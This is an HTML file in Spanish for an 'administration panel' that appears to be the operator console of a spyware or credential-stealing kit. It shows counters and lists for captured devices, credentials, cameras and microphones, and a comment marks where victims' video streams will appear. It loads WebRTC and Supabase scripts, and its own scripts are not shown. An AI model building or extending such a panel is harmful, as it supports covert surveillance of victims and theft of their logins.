<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración</title>
    <link rel="stylesheet" href="css/admin.css">
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>PANEL DE ADMINISTRACIÓN</h1>
            <div class="status">
                <span class="status-indicator active"></span>
                <span>Sistema Activo</span>
            </div>
        </div>

        <div class="dashboard">
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-label">Dispositivos</span>
                    <span class="stat-value" id="device-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Credenciales</span>
                    <span class="stat-value" id="credentials-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Cámaras</span>
                    <span class="stat-value" id="camera-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Micrófonos</span>
                    <span class="stat-value" id="mic-count">0</span>
                </div>
            </div>

            <div class="main-grid">
                <div class="device-list">
                    <h2>Terminales de Monitoreo</h2>
                    <div id="devices-container"></div>
                </div>

                <div class="credentials-list">
                    <h2>Registros de Acceso (Credenciales)</h2>
                    <div id="credentials-container">
                        <p style="color: var(--text-muted); font-size: 0.8rem; text-align: center;">Buscando registros...</p>
                    </div>
                </div>
            </div>

            <div class="media-streams" id="media-streams">
                <h2>Señales de Video e Inteligencia Visual</h2>
                <div id="streams-container">
                    <!-- Los videos de las victimas irán aquí -->
                </div>
            </div>
        </div>

        <div class="terminal">
            <div class="terminal-header">
                <span>Terminal de Control</span>
                <button id="clear-terminal">Limpiar</button>
            </div>
            <div class="terminal-body" id="terminal"></div>
        </div>
    </div>

    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <script src="js/config.js"></script>
    <script src="js/admin.js"></script>
</body>

</html>
